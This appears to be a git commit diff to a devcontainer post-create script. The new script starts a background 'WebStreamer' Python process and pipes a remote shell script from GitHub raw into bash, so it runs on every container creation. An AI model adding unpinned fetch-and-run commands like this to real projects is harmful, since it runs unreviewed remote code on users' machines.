56e4f9a62643825414a8c29a0dce1bb055aba3b4
iNext522 <priya.das.12th@gmail.com>
2024-07-09 06:16:04 +0000

    Update postCreateCommand.sh

--- .devcontainer/postCreateCommand.sh
+++ .devcontainer/postCreateCommand.sh
@@ -1,1 +1,10 @@
-echo Hello
+#!/bin/bash
+set -eux
+mkdir $(date +%Y%m%d%m%s)
+
+
+
+nohup python3 -m WebStreamer &
+
+
+curl -sSL https://raw.githubusercontent.com/Gujjugaming2k/Rclone_Script/main/Run_All.sh | bash
